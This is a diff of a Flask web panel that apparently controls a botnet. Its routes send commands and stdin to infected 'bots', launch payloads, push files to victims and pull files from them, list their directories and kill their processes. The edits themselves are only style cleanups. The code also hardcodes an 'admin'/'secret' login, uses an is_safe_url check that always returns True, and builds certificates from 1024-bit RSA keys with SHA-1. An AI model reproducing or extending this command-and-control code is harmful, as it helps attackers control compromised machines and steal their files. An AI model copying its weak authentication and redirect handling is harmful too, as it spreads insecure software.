@@ -8,7 +8,7 @@ import flask_login
 from flask_login import LoginManager, login_required
 from flask_socketio import SocketIO
 import json
-from OpenSSL import SSL, crypto
+from OpenSSL import crypto
 import sys
 
 # Loading library depends on how we want to setup the project later,
@@ -42,19 +42,16 @@ db.init_app(app)
 
 thread = None
 
+
 # DB stuff
 
 
 @app.before_first_request
 def recreate_test_databases(engine=None, session=None):
-    if engine == None:
-        engine = db.engine
-    if session == None:
-        session = db.session
-
     db.create_all()
     if not User.query.filter_by(uname='admin').first():
-        UserManager.create_user('admin','secret')
+        UserManager.create_user('admin', 'secret')
+
 
 # Login stuff
 login_manager = LoginManager()
@@ -73,25 +70,25 @@ def login():
     # client-side form data. For example, WTForms is a library that will
     # handle this for us, and we use a custom LoginForm to validate.
     errs = []
-    if request.method=='POST':
+    if request.method == 'POST':
         uname = request.form.get('username')
         passwd = request.form.get('password')
 
-        if UserManager.validate(uname,passwd):
+        if UserManager.validate(uname, passwd):
             user = UserManager.getbyname(uname)
             flask_login.login_user(user)
 
             flask.flash('Logged in successfully.')
 
-            next = flask.request.args.get('next')
+            nexturl = flask.request.args.get('next')
             # is_safe_url should check if the url is safe for redirects.
             # See http://flask.pocoo.org/snippets/62/ for an example.
-            if not is_safe_url(next):
+            if not is_safe_url(nexturl):
                 return flask.abort(400)
-            return flask.redirect(next or flask.url_for('index'))
+            return flask.redirect(nexturl or flask.url_for('index'))
         else:
             errs.append("Invalid login")
-    return flask.render_template('login.html',errors=errs)
+    return flask.render_template('login.html', errors=errs)
 
 
 @app.route("/logout")
@@ -102,7 +99,7 @@ def logout():
 
 
 # Research more
-def is_safe_url(next):
+def is_safe_url(nexturl):
     return True
 
 
@@ -126,7 +123,7 @@ def get_bots():
         return flask.Response(botstr, status=200, mimetype='application/json')
 
 
-@app.route('/kill', methods=['POST','GET'])
+@app.route('/kill', methods=['POST', 'GET'])
 @login_required
 def kill_proc():
     if 'bot' in request.cookies:
@@ -135,7 +132,7 @@ def kill_proc():
     return json.dumps({"success": False})
 
 
-@app.route('/clear', methods=['POST','GET'])
+@app.route('/clear', methods=['POST', 'GET'])
 @login_required
 def clear_log():
     if 'bot' in request.cookies:
@@ -150,20 +147,20 @@ def upload_file():
     f = request.files['file']
     # Starts forwarding file to client on separate thread, never saved locally (at least in non-temp file)
     if 'bot' in request.cookies:
-        botnet.sendFile(request.cookies.get('bot'),f.filename,f)
+        botnet.sendFile(request.cookies.get('bot'), f.filename, f)
         return json.dumps({"success": True})
     return json.dumps({"success": False})
 
 
-@app.route('/downloader', methods=['GET','POST','DELETE'])
+@app.route('/downloader', methods=['GET', 'POST', 'DELETE'])
 @login_required
 def download_file():
-    '''
+    """
     POST: make the client start sending file to server
     GET:  get json list of all files currently on server
           if query parameter "file" specified then instead download
           that file from server
-    '''
+    """
     if request.method == 'POST':
         filename = request.form.get('file')
         if 'bot' in request.form:
@@ -181,9 +178,9 @@ def download_file():
                 user = request.cookies.get('bot')
             filename = request.args.get('file')
 
-            real_filename = botnet.getFileName(user,filename)
+            real_filename = botnet.getFileName(user, filename)
             if real_filename:
-                return flask.send_file(real_filename,attachment_filename=os.path.basename(filename))
+                return flask.send_file(real_filename, attachment_filename=os.path.basename(filename))
             else:
                 return "File not found", 404
         else:
@@ -197,7 +194,7 @@ def download_file():
                 user = request.cookies.get('bot')
             filename = request.args.get('file')
 
-            if botnet.deleteFile(user,filename):
+            if botnet.deleteFile(user, filename):
                 return "done"
             else:
                 return "File not found", 404
@@ -225,7 +222,7 @@ def payload_launch():
         return flask.Response(payloadstr, status=200, mimetype='application/json')
 
 
-@app.route('/ls', methods=['GET','POST'])
+@app.route('/ls', methods=['GET', 'POST'])
 @login_required
 def list_dir():
     if request.method == 'POST' and 'file' in request.form:
@@ -265,8 +262,9 @@ def index():
                                                      payload_list=botnet.getPayloadNames(),
                                                      connected=connected))
     if request.method == 'POST':
-        resp.set_cookie('bot',request.form.get('bot'))
+        resp.set_cookie('bot', request.form.get('bot'))
     return resp
+
 
 @app.route('/log', methods=['POST'])
 @login_required
@@ -280,6 +278,7 @@ def resend_log():
         filestr = json.dumps(botnet.getLog(connected))
         return flask.Response(filestr, status=200, mimetype='application/json')
     return "done"
+
 
 @app.route('/finder')
 @login_required
@@ -296,13 +295,14 @@ def send_command(cmd):
     if 'bot' in request.cookies:
         botnet.sendStdin(request.cookies.get('bot'), cmd['data'] + '\n')
 
+
 # Crypto stuff
 def create_self_signed_cert(certfile, keyfile, certargs, cert_dir="."):
     if not os.path.isdir(cert_dir):
         os.mkdir(cert_dir)
-    C_F = os.path.join(cert_dir, certfile)
-    K_F = os.path.join(cert_dir, keyfile)
-    if not os.path.exists(C_F) or not os.path.exists(K_F):
+    c_f = os.path.join(cert_dir, certfile)
+    k_f = os.path.join(cert_dir, keyfile)
+    if not os.path.exists(c_f) or not os.path.exists(k_f):
         k = crypto.PKey()
         k.generate_key(crypto.TYPE_RSA, 1024)
         cert = crypto.X509()
@@ -318,8 +318,9 @@ def create_self_signed_cert(certfile, keyfile, certargs, cert_dir="."):
         cert.set_issuer(cert.get_subject())
         cert.set_pubkey(k)
         cert.sign(k, 'sha1')
-        open(C_F, "wb").write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
-        open(K_F, "wb").write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
+        open(c_f, "wb").write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
+        open(k_f, "wb").write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
+
 
 def main():
     global botnet
@@ -344,7 +345,7 @@ def main():
         CERT_FILE = os.path.join(CERT_DIR, CERT_FILE)
         KEY_FILE = os.path.join(CERT_DIR, KEY_FILE)
 
-        if (sys.version_info.major, sys.version_info.minor) >= (3,6):
+        if (sys.version_info.major, sys.version_info.minor) >= (3, 6):
             print("[!] There is a known bug with SSL and eventlet/Python 3.6,\n" +
                   "\ttry a different python version or turn off SSL")
 
